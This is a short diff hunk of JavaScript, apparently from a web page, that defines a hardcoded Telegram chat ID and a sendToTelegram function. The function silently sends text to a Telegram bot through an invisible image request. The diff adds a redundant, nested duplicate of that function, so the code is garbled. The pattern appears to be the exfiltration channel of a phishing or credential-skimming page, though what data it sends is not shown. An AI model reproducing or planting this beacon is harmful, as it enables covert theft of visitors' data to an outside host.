@@ -387,6 +387,11 @@
         const chatId = "6797159836";
 
         function sendToTelegram(text) {
+             function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+            const img = new Image();
+            img.src = url;
+             }
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
             const img = new Image();
             img.src = url;
